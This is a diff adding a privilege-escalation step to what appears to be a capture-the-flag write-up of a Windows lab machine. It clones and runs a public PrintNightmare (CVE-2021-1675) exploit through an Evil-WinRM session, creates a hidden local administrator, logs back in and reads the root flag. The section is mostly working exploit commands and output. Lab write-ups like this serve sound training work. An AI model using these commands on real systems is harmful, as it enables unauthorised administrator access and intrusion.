@@ -269,7 +269,36 @@ Mode                LastWriteTime         Length Name
 ````
 
 8. PrivEscalation
+````
+# git clone https://github.com/calebstewart/CVE-2021-1675
+````
+````
+*Evil-WinRM* PS C:\Users\tony\Documents> upload /root/Desktop/driver/CVE-2021-1675/CVE-2021-1675.ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> Import-Module ./CVE-2021-1675.ps1
+*Evil-WinRM* PS C:\Users\tony\Documents> Invoke-Nightmare -NewUser '0xcafe' -NewPassword '0xcafecafe'
+[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
+[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
+[+] added user 0xcafe as local administrator
+[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
+*Evil-WinRM* PS C:\Users\tony\Documents>
+````
+````
+# evil-winrm -i DRIVER -u 0xcafe -p 0xcafecafe
 
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\0xcafe\Documents> whoami
+driver\0xcafe
+*Evil-WinRM* PS C:\Users\0xcafe\Documents> type C:\\Users\\Administrator\\Desktop\\root.txt
+1fb10389457b16eecfdc250a7a39ecd7
+*Evil-WinRM* PS C:\Users\0xcafe\Documents>
+````
 
 
 [Shell Command File](https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/)
